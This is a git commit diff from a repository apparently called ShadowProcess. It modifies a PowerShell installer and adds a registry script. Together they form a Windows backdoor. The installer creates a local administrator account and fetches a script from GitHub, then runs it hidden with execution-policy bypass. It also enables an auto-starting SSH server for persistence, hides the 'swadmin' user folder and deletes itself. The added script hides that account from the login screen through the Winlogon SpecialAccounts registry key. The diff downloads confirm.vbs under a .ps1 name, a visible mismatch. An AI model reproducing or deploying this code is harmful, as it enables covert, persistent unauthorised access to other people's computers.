b2b7b3b80b1360e7c27977381c2a742d87bbdcf9
tobiasasa <tobias.asa@hotmail.com>
2022-09-22 15:05:06 -0700

    asd123consuerte

--- files/installer.ps1
+++ files/installer.ps1
@@ -41,23 +41,29 @@ Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 mkdir $path
 cd $path
 
+#Descargar de reg para añadir
+$radd_file = random_text
+Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$radd_file.ps1"
+
 #registro para esconder administrador
-$reg_file = random_text 
-Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"
+#$reg_file = random_text 
+#Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"
 
 #script visual basic confirmar reg
-$vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
+#$vbs_file = random_text
+#Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #instalando registro
-powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
+#powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
 #powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force
-
+powershell -windowstyle hidden -ep bypass .\"$radd_file.ps1"
 cd $path
 # estableciendo persistencia ssh
 powershell powershell.exe -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
 
-
+#ocultando usuario swadmin
+cd C:\Users
+attrib +h +s +r swadmin
 
 #autoeliminacion
 cd $initial_dir
---
+++ resources/radd.ps1
@@ -0,0 +1,9 @@
+# Set the location to the registry
+Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\'
+
+# Create a new Key
+Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force
+
+# Create new items with values
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
+
